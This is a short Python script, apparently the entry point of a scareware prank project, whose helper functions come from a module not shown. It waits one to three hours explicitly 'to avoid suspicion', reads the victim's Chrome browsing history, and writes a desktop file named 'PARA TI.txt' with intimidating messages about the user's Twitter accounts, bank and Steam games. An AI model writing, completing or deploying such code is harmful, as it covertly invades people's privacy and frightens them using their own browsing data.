from functions import *

HACKER_FILE_NAME = "PARA TI.txt"

def main():
    # Introduce a delay of 1 to 3 hours to avoid suspicion
    delay_action()

    # Get the user's Windows path
    user_path = get_user_path()

    # Retrieve Google Chrome history, when possible
    chrome_history = get_chrome_history(user_path)

    # Create a file on the desktop
    hacker_file = create_hacker_file(user_path)

    # Write scary messages
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
    check_bank_account(hacker_file, chrome_history)
    check_steam_games(hacker_file)

if __name__ == "__main__":
    main()
